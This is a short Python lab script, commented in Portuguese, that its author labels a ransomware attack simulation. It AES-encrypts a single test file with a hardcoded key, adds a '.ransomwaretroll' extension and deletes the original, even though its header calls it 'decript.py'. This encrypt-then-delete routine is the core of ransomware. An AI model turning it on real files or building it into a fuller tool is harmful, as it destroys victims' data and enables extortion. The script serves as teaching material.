# -*- coding: utf-8 -*-
'''
File: decript.py
Author: Marcelo Soares
Description: Script para simular o ataque de um Ransomware
Requirement: pip install pyaes
'''
import os
import pyaes

# Função principal para encriptar o arquivo de teste.txt
# Inclui no laboratório um tratamento de erro try-except, mas em um cenário real não estariam
def encrypt_file(input_filename, output_filename, key):
    try:
        with open(input_filename, "rb") as original_file:
            aes = pyaes.AESModeOfOperationCTR(key)
            with open(output_filename, "wb") as encrypted_file:
                while True:
                    chunk = original_file.read(1024)  # Lê o arquivo em blocos de 1 KB
                    if not chunk:
                        break
                    encrypted_chunk = aes.encrypt(chunk)
                    encrypted_file.write(encrypted_chunk)
        
        # Remover o arquivo original após a criptografia bem-sucedida
        os.remove(input_filename)
        
        print(f"Arquivo '{input_filename}' criptografado com sucesso em '{output_filename}'")
    
    except Exception as e:
        print(f"Erro ao criptografar o arquivo: {str(e)}")

# Como é um laboratório, inclui a estrutura if __name__=="__main__"
# Dessa forma o código só será executado diretamente.

if __name__ == "__main__":
    original_file_name = "teste.txt"
    encrypted_file_name = original_file_name + ".ransomwaretroll"
    encryption_key = b"testeransomwares"

    encrypt_file(original_file_name, encrypted_file_name, encryption_key) # chamada da função aqui

